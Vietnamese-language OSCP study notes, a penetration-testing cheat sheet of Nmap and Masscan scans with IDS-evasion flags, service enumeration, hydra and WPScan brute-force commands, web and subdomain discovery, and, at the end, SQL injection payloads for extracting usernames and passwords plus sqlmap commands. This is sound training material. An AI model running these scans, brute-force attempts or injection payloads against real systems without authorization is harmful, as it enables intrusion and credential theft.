OSCP Notes

# 1. Active Reconnaissance

Active Reconnaissance là giai đoạn kiểm thử thâm nhập nơi bạn tương tác trực tiếp với mục tiêu để thu thập thông tin về cơ sở hạ tầng, dịch vụ, và các lỗ hổng tiềm ẩn. Đây là bước quan trọng giúp xác định bề mặt tấn công và các vector tấn công tiềm năng cho các giai đoạn sau.

## 1.1. Network Discovery & Port Scanning

### 1.1.1. Nmap Usage & Advanced Techniques

#### Quét cơ bản

```bash
# Quét TCP SYN cơ bản (cần quyền root)
sudo nmap -sS 192.168.1.1

# Quét TCP connect (không cần quyền root)
nmap -sT 192.168.1.1

# Quét UDP (thường chậm hơn)
sudo nmap -sU 192.168.1.1

# Quét ping sweep để phát hiện hosts
nmap -sn 192.168.1.0/24

# Quét OS detection
sudo nmap -O 192.168.1.1

# Quét version detection
nmap -sV 192.168.1.1

# Quét scripts mặc định
nmap -sC 192.168.1.1

# Quét tất cả (OS, version, scripts)
sudo nmap -A 192.168.1.1
```

#### Quét nâng cao

```bash
# Quét tất cả ports
nmap -p- 192.168.1.1

# Quét TCP cụ thể
nmap -p 22,80,443 192.168.1.1

# Quét UDP ports cụ thể
sudo nmap -sU -p 53,161,162 192.168.1.1

# Quét top ports
nmap --top-ports 100 192.168.1.1

# Tăng tốc độ quét
nmap -T4 -p- --min-rate=1000 192.168.1.1

# Trốn tránh IDS/Firewall
sudo nmap -sS -D RND:10 -f --data-length 24 --randomize-hosts 192.168.1.1

# Quét NSE scripts
nmap --script=vuln 192.168.1.1

# Output formats
nmap -p- -oA scan_results 192.168.1.1  # Tạo ra 3 formats (normal, XML, grepable)
nmap -p- -oN scan.txt 192.168.1.1      # Normal format
nmap -p- -oX scan.xml 192.168.1.1      # XML format
nmap -p- -oG scan.gnmap 192.168.1.1    # Grepable format
```

#### NSE (Nmap Scripting Engine) Scripts

```bash
# Các categories scripts phổ biến
nmap --script=default 192.168.1.1      # Default scripts
nmap --script=safe 192.168.1.1         # Safe scripts
nmap --script=vuln 192.168.1.1         # Vulnerability detection
nmap --script=discovery 192.168.1.1    # Host and service discovery
nmap --script=version 192.168.1.1      # Version detection
nmap --script=auth 192.168.1.1         # Authentication bypass

# Kết hợp nhiều categories
nmap --script="vuln and safe" 192.168.1.1

# Các scripts cụ thể
nmap --script=smb-enum-shares 192.168.1.1
nmap --script=http-title 192.168.1.1
nmap --script=ssl-heartbleed 192.168.1.1

# Script với arguments
nmap --script=http-brute --script-args userdb=users.txt,passdb=pass.txt 192.168.1.1
```

#### Kết hợp nhiều kỹ thuật cho quét hiệu quả

```bash
# Quy trình quét hiệu quả

# 1. Host discovery
nmap -sn 192.168.1.0/24 -oG hosts-up.txt

# 1. Quét nhanh các hosts
cat hosts-up.txt | grep "Up" | cut -d " " -f 2 > live-hosts.txt
nmap -sS -T4 --top-ports 100 -iL live-hosts.txt -oA quick-scan

# 3. Quét toàn diện
for ip in $(cat live-hosts.txt); do
    nmap -p- -sS -sV -sC -T4 -oA full-scan-$ip $ip
done

# 3. Quét thêm UDP
for ip in $(cat live-hosts.txt); do
    sudo nmap -sU --top-ports 20 -oA udp-scan-$ip $ip
done
```

### 1.1.2. Masscan for Large-scale Scanning

Masscan là công cụ quét port cực kỳ nhanh, phù hợp cho mạng lớn.

```bash
# Quét cơ bản
sudo masscan -p22,80,443,445 192.168.1.0/24 --rate=10000

# Quét tất cả cổng
sudo masscan -p0-65535 192.168.1.0/24 --rate=50000

# Lưu kết quả vào file
sudo masscan -p0-65535 192.168.1.0/24 --rate=10000 -oJ scan.json

# Kết hợp với Nmap (quét nhanh với Masscan, chi tiết với Nmap)
sudo masscan -p0-65535 192.168.1.0/24 --rate=10000 -oL masscan.txt
ports=$(cat masscan.txt | awk '{print $3}' | sort -n | uniq | tr '\n' ',' | sed 's/,$//')
nmap -sV -p$ports 192.168.1.1
```

## 1.2. Service Enumeration

Sau khi xác định các ports và services, bước tiếp theo là thu thập thông tin chi tiết về mỗi dịch vụ.

### 1.2.1. Web Services

#### Kỹ thuật reconnaissance web cơ bản

```bash
# Lấy HTTP headers
curl -I http://192.168.1.1

# Lấy source code
curl -s http://192.168.1.1 | less

# Sử dụng Whatweb để nhận diện công nghệ web
whatweb http://192.168.1.1

# Quét với Nikto
nikto -h http://192.168.1.1

# Tìm kiếm thư mục và files
gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://192.168.1.1/FUZZ -w /usr/share/wordlists/dirb/common.txt
dirb http://192.168.1.1
```

#### Quét lỗ hổng web tự động

```bash
# OWASP ZAP automated scan
zap-cli quick-scan --self-contained --start-options "-config api.disablekey=true" http://192.168.1.1

# Nuclei scan 
nuclei -u http://192.168.1.1 -t cves/ -t vulnerabilities/
```

#### Tạo screenshots của web services

```bash
# Sử dụng EyeWitness
eyewitness --web -f urls.txt --timeout 5 --threads 5 -d output_folder

# Sử dụng Aquatone
cat live-hosts.txt | aquatone -ports 80,443,8080,8443
```

### 1.2.2. SMB Enumeration

```bash
# SMB version detection
nmap --script=smb-protocols 192.168.1.1

# Tìm shares
smbclient -L //192.168.1.1 -N
smbmap -H 192.168.1.1

# Kiểm tra null sessions
smbclient //192.168.1.1/IPC$ -N

# Liệt kê users, groups, và shares
enum4linux -a 192.168.1.1

# Kiểm tra SMB vulnerabilities
nmap --script=smb-vuln* 192.168.1.1

# Truy cập share
smbclient //192.168.1.1/share_name -U username

# CrackMapExec enumeration
crackmapexec smb 192.168.1.0/24 --shares
crackmapexec smb 192.168.1.0/24 --users
```

### 1.2.3. SNMP Enumeration

```bash
# SNMP version detection
nmap -sU -p 161 --script=snmp-info 192.168.1.1

# SNMPwalk với community strings public
snmpwalk -v2c -c public 192.168.1.1

# Onesixtyone để brute force community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.1.1

# Kiểm tra MIBs cụ thể
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.25.4.2.1.2  # Running processes
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.25.6.3.1.2  # Installed software
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.4.1.77.1.2.25   # User accounts
```

### 1.2.4. FTP Enumeration

```bash
# Kiểm tra FTP banner
nmap -p 21 --script=ftp-banner 192.168.1.1

# Kiểm tra anonymous login
nmap -p 21 --script=ftp-anon 192.168.1.1
ftp 192.168.1.1  # Username: anonymous, Password: anonymous

# Brute force đăng nhập FTP
hydra -L users.txt -P passwords.txt ftp://192.168.1.1

# Tải tất cả files từ FTP server
wget -m --no-passive ftp://anonymous:anonymous@192.168.1.1
```

### 1.2.5. SSH Enumeration

```bash
# Lấy SSH banner và key exchange
nmap -p 22 --script=ssh-hostkey,ssh2-enum-algos 192.168.1.1

# Enum SSH authentication methods
nmap -p 22 --script=ssh-auth-methods --script-args="ssh.user=root" 192.168.1.1

# Kiểm tra weak ciphers
nmap -p 22 --script=ssh-audit 192.168.1.1

# Brute force SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
```

### 1.2.6. SMTP Enumeration

```bash
# Lấy SMTP banner
nmap -p 25 --script=smtp-commands 192.168.1.1

# SMTP user enumeration
nmap -p 25 --script=smtp-enum-users 192.168.1.1
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.1.1

# Kiểm tra relay configuration
nmap -p 25 --script=smtp-open-relay 192.168.1.1 --script-args="smtp-open-relay.to=attacker@example.com, smtp-open-relay.from=victim@example.com"
```

### 1.2.7. DNS Enumeration

```bash
# Basic DNS enumeration
nmap -p 53 --script=dns-recursion,dns-zone-transfer 192.168.1.1

# Zone transfer attempt
dig @192.168.1.1 domain.com AXFR
host -l domain.com 192.168.1.1

# Brute force subdomain
dnsrecon -d domain.com -D /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt

# Reverse lookup
dnsrecon -r 192.168.1.0/24 -n 192.168.1.1
```

### 1.2.8. RPC/NFS Enumeration

```bash
# RPC information
nmap -p 111 --script=rpcinfo 192.168.1.1

# NFS exports
nmap -p 2049 --script=nfs-ls,nfs-showmount 192.168.1.1
showmount -e 192.168.1.1

# Mounting NFS share
mkdir /tmp/nfs
mount -t nfs 192.168.1.1:/share /tmp/nfs
```

### 1.2.9. Database Services

```bash
# MySQL enumeration
nmap -p 3306 --script=mysql-info,mysql-empty-password,mysql-users 192.168.1.1

# MySQL login check
mysql -h 192.168.1.1 -u root -p

# MS SQL enumeration
nmap -p 1433 --script=ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password 192.168.1.1

# PostgreSQL enumeration
nmap -p 5432 --script=postgresql-info 192.168.1.1
```

### 1.2.10. LDAP Enumeration

```bash
# LDAP information
nmap -p 389 --script=ldap-search,ldap-rootdse 192.168.1.1

# LDAP null bind
ldapsearch -x -h 192.168.1.1 -D '' -w '' -b "dc=example,dc=com"

# LDAP query with credentials
ldapsearch -x -h 192.168.1.1 -D "cn=admin,dc=example,dc=com" -w "password" -b "dc=example,dc=com"
```

## 1.3. DNS Enumeration Techniques

DNS Enumeration là một kỹ thuật quan trọng để hiểu cấu trúc domain và tìm các targets tiềm năng.

### 1.3.1. Zone Transfers

```bash
# Kiểm tra subdomain bằng zone transfer
host -l domain.com ns1.domain.com

# Sử dụng dig
dig @ns1.domain.com domain.com AXFR

# Sử dụng dnsrecon
dnsrecon -d domain.com -t axfr
```

### 1.3.2. Brute Force Discovery

```bash
# Sử dụng dnsrecon
dnsrecon -d domain.com -D /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -t brt

# Sử dụng dnsenum
dnsenum --dnsserver ns1.domain.com --enum -p 10 -s 10 domain.com

# Sử dụng fierce
fierce -dns domain.com
```

### 1.3.3. DNS Cache Snooping

```bash
# Kiểm tra nếu DNS server caching thông tin
nmap -p 53 --script=dns-cache-snoop.nse --script-args="dns-cache-snoop.mode=nonrecursive" ns1.domain.com
```

### 1.3.4. Reverse DNS Sweeping

```bash
# Reverse DNS lookup trên một range
dnsrecon -r 192.168.1.0/24 -n ns1.domain.com

# Sử dụng nmap
nmap -sL 192.168.1.0/24
```

## 1.4. Vulnerability Scanning

Quét lỗ hổng giúp xác định các điểm yếu trong mục tiêu, từ đó hỗ trợ quá trình khai thác.

### 1.4.1. Nessus

Nessus là một trong những scanner phổ biến nhất.

```bash
# Cài đặt Nessus (trên Kali)
dpkg -i Nessus-<version>.deb
service nessusd start

# Truy cập qua browser
https://localhost:8834/
```

### 1.4.2. OpenVAS

OpenVAS là giải pháp quét lỗ hổng mã nguồn mở.

```bash
# Cài đặt OpenVAS
apt-get install openvas
gvm-setup

# Kiểm tra status
gvm-check-setup

# Start service
gvm-start

# Truy cập qua browser
https://localhost:9392/
```

### 1.4.3. Nuclei

Nuclei là scanner hiện đại với nhiều templates.

```bash
# Quét cơ bản
nuclei -u https://example.com

# Quét với tất cả templates
nuclei -u https://example.com -t nuclei-templates/

# Quét chỉ với CVE templates
nuclei -u https://example.com -t nuclei-templates/cves/

# Quét network
nuclei -u 192.168.1.1 -pt network
```

### 1.4.4. Nmap NSE Script Scanning

```bash
# Quét lỗ hổng cơ bản
nmap --script=vuln 192.168.1.1

# Quét lỗ hổng SMB
nmap --script=smb-vuln* 192.168.1.1

# Quét các lỗ hổng SSL/TLS
nmap --script=ssl-* -p 443 192.168.1.1

# Quét Remote Code Execution vulnerabilities
nmap --script=*-rce* 192.168.1.1
```

## 1.5. Phương pháp tiếp cận hệ thống trong OSCP+

Trong OSCP+, phương pháp tiếp cận hệ thống và tổ chức kết quả là rất quan trọng. Dưới đây là một framework phương pháp luận hiệu quả:

### 1.5.1. Tổ Chức Quy Trình Quét

```
1. Host Discovery - xác định các hosts đang hoạt động
2. Port Scanning - xác định các cổng mở trên mỗi host
3. Service Enumeration - xác định và phân tích từng service
4. Vulnerability Assessment - tìm kiếm lỗ hổng trong services
5. Information Gathering - thu thập thông tin từ các services
6. Documentation - tài liệu hóa tất cả phát hiện và kết quả
```

### 1.5.2. Chiến lược Quét Hiệu Quả

```
1. Begin Wide, Go Deep
   - Bắt đầu với quét rộng (toàn bộ network)
   - Xác định targets hấp dẫn
   - Quét sâu vào các targets cụ thể

2. Prioritize Based on Value
   - Tập trung vào các services có giá trị cao (web servers, databases)
   - Ưu tiên các services thường có lỗ hổng (SMB, FTP, etc.)

3. Automate + Manual Verification
   - Sử dụng công cụ tự động để quét ban đầu
   - Xác minh thủ công tất cả các phát hiện
   - Đào sâu vào các dịch vụ thú vị
```

### 1.5.3. Tài liệu hóa cho OSCP+

```markdown
# Tài liệu mẫu cho OSCP+

## Target Information
- IP: 192.168.1.1
- Hostname: server1.example.com
- OS: Windows Server 2016

## Open Ports/Services
| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22   | SSH     | OpenSSH 7.6p1 | Password authentication enabled |
| 80   | HTTP    | Apache 2.4.29 | WordPress 5.2.3 |
| 445  | SMB     | SMBv1 enabled | MS17-010 vulnerable |

## Enumeration Notes
### Web Service (Port 80)
- WordPress 5.2.3 detected
- Users enumerated: admin, editor
- Vulnerable plugins: wp-file-manager v6.7

### SMB Service (Port 445)
- Anonymous access enabled
- Shares: public, backup
- Interesting files found: passwords.txt in backup share

## Vulnerability Assessment
- WordPress vulnerable to CVE-2020-XXXX
- SMB server vulnerable to MS17-010 (EternalBlue)

## Potential Attack Vectors
1. WordPress exploit using CVE-2020-XXXX
2. Brute force WordPress admin login
3. EternalBlue exploit on SMB
4. Access sensitive files in SMB shares
```

## 1.6. Công cụ tổng hợp và tự động hóa

Các công cụ tự động hóa giúp tăng hiệu quả quá trình recon.

### 1.6.1. AutoRecon

```bash
# Cài đặt
git clone https://github.com/Tib3rius/AutoRecon.git
pip3 install -r AutoRecon/requirements.txt

# Sử dụng cơ bản
python3 AutoRecon/autorecon.py 192.168.1.1

# Quét nhiều targets
python3 AutoRecon/autorecon.py 192.168.1.1 192.168.1.2 192.168.1.3

# Quét từ file
python3 AutoRecon/autorecon.py -t targets.txt
```

### 1.6.2. Reconnoitre

```bash
# Cài đặt
git clone https://github.com/codingo/Reconnoitre.git
cd Reconnoitre && python setup.py install

# Quét network
reconnoitre -t 192.168.1.0/24 -o output_directory --services

# Quét host cụ thể
reconnoitre -t 192.168.1.1 -o output_directory --services
```

### 1.6.3. Sn1per

```bash
# Cài đặt
git clone https://github.com/1N3/Sn1per.git
cd Sn1per && bash install.sh

# Quét cơ bản
sniper -t 192.168.1.1

# Quét network
sniper -t 192.168.1.0/24 -m discover
```

## 1.7. Công cụ chuyên biệt cho OSCP+

Những công cụ sau đây đặc biệt hữu ích cho OSCP+:

### 1.7.1. Tmux và Script Terminals

```bash
# Cài đặt
apt-get install tmux

# Script terminal session để log
script -a session.log

# Tmux cheat sheet
# Ctrl+b c    Create new window
# Ctrl+b "    Split horizontally
# Ctrl+b %    Split vertically
# Ctrl+b o    Switch panes
```

### 1.7.2. Custom Bash Scripts

Tạo script bash để tự động hóa các tác vụ thường xuyên:

```bash
#!/bin/bash
# recon.sh - Simple reconnaissance script

if [ -z "$1" ]; then
    echo "Usage: $0 <IP>"
    exit 1
fi

TARGET=$1
OUTDIR="recon_$TARGET"
mkdir -p $OUTDIR

echo "[+] Starting reconnaissance on $TARGET"

# Basic port scan
echo "[+] Running initial Nmap scan..."
nmap -sC -sV -oA $OUTDIR/nmap_initial $TARGET

# Get open ports for deeper scan
PORTS=$(grep -oP '\d+/open' $OUTDIR/nmap_initial.nmap | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')

if [ -n "$PORTS" ]; then
    echo "[+] Found open ports: $PORTS"
    echo "[+] Running detailed scan on open ports..."
    nmap -sC -sV -p $PORTS -oA $OUTDIR/nmap_detailed $TARGET
fi

# Web scanning if port 80 or 443 are open
if grep -q "80/open\|443/open" $OUTDIR/nmap_initial.nmap; then
    echo "[+] Web ports found, running web scans..."
    
    # HTTP or HTTPS?
    if grep -q "80/open" $OUTDIR/nmap_initial.nmap; then
        echo "[+] Port 80 is open, scanning HTTP..."
        whatweb http://$TARGET > $OUTDIR/whatweb_http.txt
        gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -o $OUTDIR/gobuster_http.txt
    fi
    
    if grep -q "443/open" $OUTDIR/nmap_initial.nmap; then
        echo "[+] Port 443 is open, scanning HTTPS..."
        whatweb https://$TARGET > $OUTDIR/whatweb_https.txt
        gobuster dir -u https://$TARGET -w /usr/share/wordlists/dirb/common.txt -o $OUTDIR/gobuster_https.txt
    fi
fi

echo "[+] Reconnaissance completed! Results saved in $OUTDIR/"
```

---

Phần 2:

# 2. Web Application Enumeration

Web Application Enumeration là quá trình thu thập thông tin chi tiết về các ứng dụng web để xác định các điểm yếu và lỗ hổng tiềm ẩn. Đây là bước quan trọng trong quá trình kiểm thử thâm nhập, giúp xác định bề mặt tấn công và tìm ra các vector tấn công tiềm năng.

## 2.1. Directory & File Discovery

Việc tìm kiếm các thư mục và tệp tin ẩn là bước quan trọng nhất trong web enumeration, có thể tiết lộ các trang quản trị, tệp cấu hình, tệp sao lưu và các nội dung quan trọng khác.

### Gobuster

Gobuster là công cụ brute force URI (thư mục, tệp, vv.) nhanh và hiệu quả.

```bash
# Brute force directories cơ bản
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Tìm kiếm với extensions cụ thể
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak

# Tùy chỉnh User-Agent
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -a "Mozilla/5.0"

# Tìm kiếm với cookie
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -c "PHPSESSID=1234567890abcdef"

# Chỉ hiển thị status code cụ thể
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -s 200,301,302
```

### Feroxbuster

Feroxbuster là công cụ brute force mới hơn, hỗ trợ đệ quy và tốc độ cao.

```bash
# Quét cơ bản
feroxbuster -u http://target.com

# Quét đệ quy với extensions
feroxbuster -u http://target.com -x php,txt,bak -d 3

# Quét với wordlist cụ thể
feroxbuster -u http://target.com -w /usr/share/wordlists/dirb/big.txt

# Quét song song nhiều đường dẫn
feroxbuster -u http://target.com/path1 -u http://target.com/path2

# Quét với nhiều luồng và timeout
feroxbuster -u http://target.com -t 100 --timeout 7
```

### Dirsearch

Một công cụ tìm kiếm thư mục web khác với nhiều tính năng hữu ích.

```bash
# Quét cơ bản
dirsearch -u http://target.com

# Quét với extensions cụ thể
dirsearch -u http://target.com -e php,html,js

# Quét với từ điển tùy chỉnh
dirsearch -u http://target.com -w /path/to/wordlist.txt

# Quét đệ quy
dirsearch -u http://target.com --recursive -d 2

# Lọc theo status code
dirsearch -u http://target.com --exclude-status 404,403
```

### FFuF (Fuzz Faster U Fool)

FFuF là một công cụ fuzzing web hiện đại và nhanh chóng.

```bash
# Directory discovery cơ bản
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ

# Tìm kiếm files với extensions
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ -e .php,.txt,.html

# Tìm kiếm với filter response
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ -fc 404

# Fuzzing parameters
ffuf -w params.txt -u http://target.com/script.php?FUZZ=value

# Fuzzing với POST requests
ffuf -w /usr/share/wordlists/dirb/common.txt -X POST -d "username=admin&password=FUZZ" -u http://target.com/login
```

## 2.2. Technology Stack Identification

Xác định công nghệ được sử dụng trong ứng dụng web giúp hiểu được các lỗ hổng tiềm ẩn, vì mỗi công nghệ có các điểm yếu riêng.

### Wappalyzer

Wappalyzer là một tiện ích mở rộng trình duyệt phổ biến xác định công nghệ được sử dụng trên websites.

```bash
# Sử dụng Wappalyzer CLI
npx wappalyzer https://target.com
```

### Whatweb

Whatweb là một công cụ nhận dạng web từ dòng lệnh.

```bash
# Quét cơ bản
whatweb target.com

# Quét chi tiết
whatweb -v target.com

# Quét aggressive
whatweb -a 3 target.com

# Lưu kết quả vào file
whatweb target.com -o results.txt
```

### HTTP Headers Analysis

Phân tích HTTP headers có thể tiết lộ nhiều thông tin về server và công nghệ.

```bash
# Sử dụng curl để xem headers
curl -I http://target.com

# Sử dụng burpsuite để phân tích toàn bộ response

# Sử dụng OpenSSL để kiểm tra TLS/SSL
openssl s_client -connect target.com:443 -showcerts
```

### Fingerprinting Framework

```bash
# Nikto web server scanner
nikto -h http://target.com

# Nmap script để fingerprint web servers
nmap --script=http-enum,http-headers,http-methods,http-webdav-scan -p 80,443 target.com
```

## 2.3. CMS Detection & Enumeration

Content Management Systems (CMS) như WordPress, Joomla, và Drupal thường có các lỗ hổng đặc thù.

### WordPress

```bash
# WPScan - công cụ security scanner chuyên dụng cho WordPress
wpscan --url http://target.com

# Enum all plugins
wpscan --url http://target.com --enumerate p

# Enum themes, users, timthumbs, db backups
wpscan --url http://target.com --enumerate t,u,tt,db

# Brute force users với password list
wpscan --url http://target.com --passwords /path/to/wordlist.txt --usernames admin
```

### Joomla

```bash
# JoomScan
joomscan -u http://target.com

# Tìm components
joomscan --components -u http://target.com
```

### Drupal

```bash
# Droopescan
droopescan scan drupal -u http://target.com

# Nmap NSE scripts
nmap --script=http-drupal-enum -p 80 target.com
```

### Generic CMS Detection

```bash
# CMSeek
cmseek -u http://target.com

# Whatcms.org API
curl -s https://whatcms.org/API/CMS?key=API_KEY&url=http://target.com
```

## 2.4. API Endpoint Discovery

Việc phát hiện và tìm hiểu các API endpoints là rất quan trọng vì chúng thường là các vector tấn công chính.

### Manual Discovery

```bash
# Kiểm tra các đường dẫn phổ biến
curl http://target.com/api
curl http://target.com/api/v1
curl http://target.com/api/v2
curl http://api.target.com

# Kiểm tra với OPTIONS method
curl -X OPTIONS http://target.com/api

# Tìm kiếm thư mục liên quan đến API
gobuster dir -u http://target.com -w /usr/share/wordlists/api_paths.txt
```

### API Documentation Endpoints

```bash
# Kiểm tra các endpoint documentation phổ biến
curl http://target.com/swagger
curl http://target.com/swagger-ui.html
curl http://target.com/api-docs
curl http://target.com/openapi.json
curl http://target.com/swagger/index.html
```

### Automated API Discovery

```bash
# APIKit for Burp Suite
# Cài đặt extension này vào Burp Suite

# kiterunner - Công cụ API discovery
kr scan http://target.com -w api_wordlist.txt
```

## 2.5. Parameter Discovery & Analysis

Khám phá các tham số ẩn có thể dẫn đến việc khai thác các lỗ hổng như SQLi, XSS, và LFI.

### Arjun

Arjun là công cụ chuyên dụng để phát hiện các tham số HTTP ẩn.

```bash
# Phát hiện GET parameters
arjun -u http://target.com/page.php -m GET

# Phát hiện POST parameters
arjun -u http://target.com/form.php -m POST

# Sử dụng wordlist tùy chỉnh
arjun -u http://target.com/page.php -w params_wordlist.txt
```

### ParamSpider

ParamSpider tìm kiếm các tham số từ các archive của web.

```bash
python3 paramspider.py --domain target.com
```

### Burp Suite Analysis

Sử dụng Burp Suite để phân tích các parameters.

- **Spider**: Để crawl và tìm các parameters
- **Param Miner Extension**: Để brute force tham số
- **Autorize Extension**: Để kiểm tra quyền truy cập tham số

## 2.6. JavaScript Analysis

Phân tích mã JavaScript có thể tiết lộ các endpoints ẩn, API keys, và logic ứng dụng.

### Manual Code Review

```bash
# Tải tất cả JavaScript files
wget -r -l1 -A.js http://target.com

# Tìm kiếm URLs trong JavaScript files
grep -r "http://" --include="*.js" .
grep -r "https://" --include="*.js" .

# Tìm kiếm API keys, tokens
grep -r "key" --include="*.js" .
grep -r "token" --include="*.js" .
grep -r "api" --include="*.js" .
```

### Automated JS Analysis

```bash
# JSParser
python3 jsparser.py --url http://target.com --output results.txt

# LinkFinder
python3 linkfinder.py -i http://target.com -d -o results.html

# SecretFinder
python3 secretfinder.py -i http://target.com -o results.html
```

### Analyzing Minified JavaScript

```bash
# Pretty-print với online tools như beautifier.io

# Sử dụng Node.js để unminify
npm install -g js-beautify
js-beautify ugly.js > pretty.js
```

## 2.7. Subdomain Enumeration

Subdomain enumeration có thể mở rộng đáng kể bề mặt tấn công và tiết lộ các hệ thống nội bộ.

### Passive Subdomain Enumeration

```bash
# Sử dụng Amass passive mode
amass enum -passive -d target.com

# Sublist3r
sublist3r -d target.com

# Sử dụng Shodan
shodan search hostname:target.com
```

### Active Subdomain Enumeration

```bash
# Sử dụng Amass active mode
amass enum -active -d target.com -src

# DNS brute forcing với dnsrecon
dnsrecon -d target.com -D /usr/share/wordlists/subdomains.txt -t brt

# Subdomain brute force với gobuster
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt
```

### Certificate Transparency Logs

```bash
# Sử dụng crt.sh
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].common_name' | sort -u

# Sử dụng certspotter
curl -s "https://api.certspotter.com/v1/issuances?domain=target.com&include_subdomains=true&expand=dns_names" | jq '.[].dns_names[]' | tr -d '"' | sort -u
```

## 2.8. Virtual Host Discovery

Phát hiện các virtual hosts có thể tiết lộ các ứng dụng web ẩn trên cùng một IP.

```bash
# Sử dụng gobuster vhost mode
gobuster vhost -u http://target.com -w /usr/share/wordlists/subdomains.txt

# Ffuf VHOST discovery
ffuf -w /usr/share/wordlists/subdomains.txt -u http://target.com -H "Host: FUZZ.target.com" -fw 2

# Virtual Host Scanner
vhost-scanner -t http://target.com -w /usr/share/wordlists/subdomains.txt
```

## 2.9. Web Application Firewall (WAF) Detection

Phát hiện và xác định WAF có thể giúp điều chỉnh các kỹ thuật tấn công.

```bash
# wafw00f
wafw00f http://target.com

# Nmap NSE script
nmap -p 80,443 --script=http-waf-detect,http-waf-fingerprint target.com

# identYwaf
python3 identYwaf.py -u http://target.com
```

## 2.10. Automating Web Enumeration

Tự động hóa quá trình enum có thể tiết kiệm thời gian và cung cấp kết quả toàn diện.

### One-liner Scripts

```bash
# Subdomain discovery + Screenshot
subfinder -d target.com | httpx -screenshot

# Full directory enumeration pipeline
subfinder -d target.com | httpx -silent | xargs -I{} feroxbuster -u {} -x php,bak,txt -d 2
```

### Custom Scripts

```bash
#!/bin/bash
# Simple web enum automation script

target=$1
output_dir="recon_$target"
mkdir -p $output_dir

echo "[+] Starting web application enumeration for $target"

# Subdomain enumeration
echo "[+] Enumerating subdomains..."
subfinder -d $target -o $output_dir/subdomains.txt
amass enum -passive -d $target -o $output_dir/subdomains_amass.txt
cat $output_dir/subdomains*.txt | sort -u > $output_dir/all_subdomains.txt

# Check for live hosts
echo "[+] Checking for live hosts..."
cat $output_dir/all_subdomains.txt | httpx -silent -o $output_dir/live_subdomains.txt

# Technology stack identification
echo "[+] Identifying technologies..."
whatweb -i $output_dir/live_subdomains.txt -v -a 3 --log-json=$output_dir/whatweb_results.json

# Directory discovery
echo "[+] Starting directory discovery..."
while read -r subdomain; do
    domain_clean=$(echo $subdomain | sed 's/https\?:\/\///' | sed 's/\/.*//')
    echo "[+] Directory bruteforcing on $domain_clean"
    feroxbuster -u $subdomain -x php,txt,html,bak -d 2 -o $output_dir/dirs_$domain_clean.txt
done < $output_dir/live_subdomains.txt

echo "[+] Enumeration completed! Results saved in $output_dir/"
```

# 3. Common Web Vulnerabilities

Web vulnerabilities là những điểm yếu trong các ứng dụng web có thể bị lợi dụng để thực hiện các cuộc tấn công, bao gồm truy cập trái phép, đánh cắp dữ liệu, và thực thi mã từ xa. Hiểu biết và phát hiện các lỗ hổng phổ biến này là kỹ năng thiết yếu cho OSCP+.

## 3.1. SQL Injection

SQL Injection (SQLi) là kỹ thuật tấn công cho phép chèn mã SQL độc hại vào các truy vấn mà ứng dụng thực hiện đến cơ sở dữ liệu, có thể dẫn đến truy cập trái phép, đánh cắp dữ liệu, hoặc thậm chí kiểm soát server.

### 3.1.1. Manual Testing

#### Các kỹ thuật phát hiện cơ bản:

```
# Kiểm tra lỗi với các ký tự đặc biệt
' OR 1=1 --
" OR 1=1 --
') OR '1'='1
1 OR 1=1

# Kiểm tra lỗi dựa trên thời gian
' OR SLEEP(5) --
" OR pg_sleep(5) --
' OR 1=1 AND SLEEP(5) --
```

#### Phát hiện loại cơ sở dữ liệu:

```
# MySQL
' OR @@version --
' UNION SELECT @@version,2 --

# MSSQL
' OR @@SERVERNAME=@@SERVERNAME --
' UNION SELECT @@version,2 --

# Oracle
' OR ROWNUM=ROWNUM --
' UNION SELECT banner,2 FROM v$version --

# PostgreSQL
' OR version() --
' UNION SELECT version(),2 --
```

#### Trích xuất dữ liệu với UNION:

```
# Xác định số cột
' UNION SELECT NULL --
' UNION SELECT NULL,NULL --
' UNION SELECT NULL,NULL,NULL --

# Trích xuất dữ liệu khi đã biết số cột (ví dụ 3 cột)
' UNION SELECT database(),user(),version() --
' UNION SELECT table_name,2,3 FROM information_schema.tables --
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT username,password,3 FROM users --
```

#### Blind SQL Injection:

```
# Boolean-based
' AND (SELECT 'x' FROM users LIMIT 1)='x' --
' AND (SELECT 'x' FROM users WHERE username='admin')='x' --
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>70 --

# Time-based
' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>70, SLEEP(5), 0) --
```

### 3.1.2. SQLMap Techniques

SQLMap là công cụ tự động hóa mạnh mẽ cho việc phát hiện và khai thác lỗ hổng SQL Injection.

```bash
# Kiểm tra cơ bản với tham số GET
sqlmap -u "http://target.com/page.php?id=1"

# Kiểm tra tất cả tham số
sqlmap -u "http://target.com/page.php?id=1&user=admin" --forms --batch

# Kiểm tra với dữ liệu POST
sqlmap -u "http://target.com/login.php" --data "username=admin&password=test"

# Kiểm tra với cookie
sqlmap -u "http://target.com" --cookie "PHPSESSID=1234567890abcdef"
